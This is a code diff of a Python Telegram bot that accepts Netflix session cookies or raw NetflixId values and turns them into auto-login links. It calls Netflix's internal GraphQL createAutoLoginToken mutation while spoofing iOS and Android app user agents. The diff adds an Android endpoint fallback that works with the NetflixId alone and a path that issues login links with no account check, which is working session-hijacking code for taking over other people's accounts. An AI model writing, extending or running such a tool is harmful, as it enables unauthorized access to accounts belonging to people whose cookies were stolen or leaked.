@@ -73,9 +73,11 @@ GQL_PAYLOAD = {
                       "id": "76e97129-f4b5-41a0-a73c-12e674896849"}},
 }
 
-IOS_URL = "https://ios.prod.ftl.netflix.com/graphql"
-IOS_UA  = "Netflix/16.8.1 CFNetwork/1410.1 Darwin/22.6.0"
-WEB_UA  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+IOS_URL     = "https://ios.prod.ftl.netflix.com/graphql"
+ANDROID_URL = "https://android13.prod.ftl.netflix.com/graphql"
+IOS_UA      = "Netflix/16.8.1 CFNetwork/1410.1 Darwin/22.6.0"
+ANDROID_UA  = "Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ3A.230901.001)"
+WEB_UA      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
 
 
 # ─── UTILS ────────────────────────────────────────────────────────────────────
@@ -395,56 +397,71 @@ def check_account(cookie_dict):
 
 # ─── TOKEN — iOS DIRECT CALL ─────────────────────────────────────────────────
 
-def generate_nftoken(cookie_dict, session_cookies=None):
-    if session_cookies:
-        merged = dict(cookie_dict)
-        for k, v in session_cookies.items():
-            if v and not merged.get(k): merged[k] = v
-        cookie_dict = merged
+def generate_nftoken(cookie_dict_or_nfid, session_cookies=None):
+    """Generate token from cookie dict OR plain nfID string.
+    Uses Android endpoint with nfID-only cookie for best compatibility."""
+
+    # Accept either a plain nfID string or a cookie dict
+    if isinstance(cookie_dict_or_nfid, str):
+        nfid = cookie_dict_or_nfid.strip()
+        cookie_dict = {"NetflixId": nfid}
+    else:
+        cookie_dict = dict(cookie_dict_or_nfid)
+        if session_cookies:
+            for k, v in session_cookies.items():
+                if v and not cookie_dict.get(k): cookie_dict[k] = v
 
     nfid = cookie_dict.get("NetflixId", "")
     if not nfid: return None, ["NetflixId"]
 
-    cookie_str = "; ".join(f"{k}={v}" for k, v in cookie_dict.items() if v)
+    # Use only NetflixId for the Android endpoint — no other cookies needed
+    cookie_str = f"NetflixId={nfid}"
 
-    try:
-        resp = requests.post(IOS_URL, headers={
-            "User-Agent": IOS_UA,
-            "Accept": "multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json",
-            "Content-Type": "application/json",
-            "Origin": "https://www.netflix.com",
-            "Referer": "https://www.netflix.com/",
-            "Cookie": cookie_str,
-        }, json=GQL_PAYLOAD, timeout=20)
+    # Try Android endpoint first (works with nfID-only)
+    for label, url, ua in [("Android", ANDROID_URL, ANDROID_UA), ("iOS", IOS_URL, IOS_UA)]:
+        try:
+            resp = requests.post(url, headers={
+                "User-Agent": ua,
+                "Accept": "multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json",
+                "Content-Type": "application/json",
+                "Origin": "https://www.netflix.com",
+                "Referer": "https://www.netflix.com/",
+                "Cookie": cookie_str,
+            }, json=GQL_PAYLOAD, timeout=20)
 
-        if resp.status_code == 200:
-            data = resp.json()
-            token_obj = (data.get("data") or {}).get("createAutoLoginToken")
-            if token_obj:
-                token = token_obj if isinstance(token_obj, str) else (token_obj.get("token") or token_obj.get("value") or token_obj.get("nftoken"))
-                if token and len(token) > 10:
-                    now = datetime.now()
-                    exp_ts = time.time() + 59 * 60
-                    diff = int(exp_ts - time.time())
-                    h, rem = divmod(diff, 3600)
-                    mi, s = divmod(rem, 60)
-                    enc = quote(token, safe="")
-                    return {
-                        "token": token, "generated": now.strftime("%Y-%m-%d %H:%M:%S"),
-                        "expires": datetime.fromtimestamp(exp_ts).strftime("%Y-%m-%d %H:%M:%S"),
-                        "remaining": f"0d {h}h {mi}m {s}s",
-                        "phone_url": f"https://netflix.com/unsupported?nftoken={enc}",
-                        "pc_url": f"https://www.netflix.com/youraccount?nftoken={enc}",
-                        "endpoint": "iOS",
-                    }, []
-            errors = data.get("errors", [])
-            if errors: logger.warning(f"[TOKEN] iOS: {errors[0].get('message','')[:200]}")
-        else:
-            logger.warning(f"[TOKEN] iOS HTTP {resp.status_code}")
-    except requests.exceptions.Timeout:
-        logger.warning("[TOKEN] iOS TIMEOUT")
-    except Exception as e:
-        logger.warning(f"[TOKEN] iOS: {e}")
+            if resp.status_code == 200:
+                data = resp.json()
+                token_obj = (data.get("data") or {}).get("createAutoLoginToken")
+                if token_obj:
+                    token = token_obj if isinstance(token_obj, str) else (token_obj.get("token") or token_obj.get("value") or token_obj.get("nftoken"))
+                    if token and len(token) > 10:
+                        now = datetime.now()
+                        exp_ts = time.time() + 59 * 60
+                        diff = int(exp_ts - time.time())
+                        h, rem = divmod(diff, 3600)
+                        mi, s = divmod(rem, 60)
+                        enc = quote(token, safe="")
+                        return {
+                            "token": token, "generated": now.strftime("%Y-%m-%d %H:%M:%S"),
+                            "expires": datetime.fromtimestamp(exp_ts).strftime("%Y-%m-%d %H:%M:%S"),
+                            "remaining": f"0d {h}h {mi}m {s}s",
+                            "phone_url": f"https://netflix.com/unsupported?nftoken={enc}",
+                            "pc_url": f"https://www.netflix.com/youraccount?nftoken={enc}",
+                            "endpoint": label,
+                        }, []
+                errors = data.get("errors", [])
+                if errors:
+                    logger.warning(f"[TOKEN] {label}: {errors[0].get('message','')[:200]}")
+                    continue  # try next endpoint
+            else:
+                logger.warning(f"[TOKEN] {label} HTTP {resp.status_code}")
+                continue
+        except requests.exceptions.Timeout:
+            logger.warning(f"[TOKEN] {label} TIMEOUT")
+            continue
+        except Exception as e:
+            logger.warning(f"[TOKEN] {label}: {e}")
+            continue
 
     return None, []
 
@@ -650,6 +667,50 @@ async def process_cookie_text(text, mode, source, update, context, filter_batch=
     else: await update.message.reply_text(msg, parse_mode="HTML", disable_web_page_preview=True)
 
 
+# ─── DIRECT nfID TOKEN GENERATION ─────────────────────────────────────────
+
+async def process_nfid_direct(nfid, update, context):
+    """Generate token directly from a plain nfID string — no account check."""
+    global stats
+
+    sm = await update.message.reply_text(
+        "🔑 <b>nfID Detected</b>\n\n"
+        "<b>Status:</b> Generating token via Android endpoint...\n"
+        "<b>Input:</b> Raw nfID string\n\n"
+        "⏳ Please wait...",
+        parse_mode="HTML"
+    )
+
+    stats["total_checked"] += 1
+    loop = asyncio.get_event_loop()
+    ti, missing = await loop.run_in_executor(None, lambda: generate_nftoken(nfid))
+
+    if ti:
+        stats["total_valid"] += 1
+        stats["total_tokens"] += 1
+        await sm.edit_text(
+            "✅ <b>Token Generated!</b>\n\n"
+            f"🔑 <b>Token Information:</b>\n"
+            f"• Endpoint: {ti['endpoint']}\n"
+            f"• Generated: {ti['generated']}\n"
+            f"• Expires: {ti['expires']}\n"
+            f"• Remaining: {ti['remaining']}\n\n"
+            f"📱 Phone Login: <a href=\"{ti['phone_url']}\">Click to Login</a>\n"
+            f"🖥️ PC Login: <a href=\"{ti['pc_url']}\">Click to Login</a>\n\n"
+            f"📊 Source: Direct nfID",
+            parse_mode="HTML",
+            disable_web_page_preview=True
+        )
+    else:
+        stats["total_invalid"] += 1
+        reason = f"missing: {', '.join(missing)}" if missing else "API error or invalid nfID"
+        await sm.edit_text(
+            f"❌ <b>Token Generation Failed</b>\n\n⚠️ {reason}\n\n"
+            "Make sure you sent a valid <code>NetflixId</code> value.",
+            parse_mode="HTML"
+        )
+
+
 # ─── COMMANDS ─────────────────────────────────────────────────────────────────
 
 async def start(update, context):
@@ -682,10 +743,28 @@ async def button_callback(update, context):
     elif d in ("action_start","action_file","action_text"): await q.message.reply_text("📨 Send cookies now!")
 
 async def handle_message(update, context):
-    text = update.message.text or ""
+    text = (update.message.text or "").strip()
+    if not text:
+        await update.message.reply_text("❓ Send a <code>NetflixId</code> value or full cookie string.", parse_mode="HTML")
+        return
+
+    # Full cookie format (contains NetflixId=...)
     if "NetflixId" in text or "netflixid" in text.lower():
         await process_cookie_text(text, context.user_data.get("mode","fullinfo"), "Text Input", update, context)
-    else: await update.message.reply_text("❓ Send cookie with <code>NetflixId=</code>", parse_mode="HTML")
+        return
+
+    # Plain nfID string — generate token directly (no account check needed)
+    nfid = text.strip().split()[0].strip()  # take first token in case of extra whitespace
+    if len(nfid) > 20:
+        await process_nfid_direct(nfid, update, context)
+        return
+
+    await update.message.reply_text(
+        "❓ Send one of:\n"
+        "• A raw <code>nfID</code> string (long token value)\n"
+        "• Full cookie with <code>NetflixId=...</code>",
+        parse_mode="HTML"
+    )
 
 async def handle_file(update, context):
     doc = update.message.document
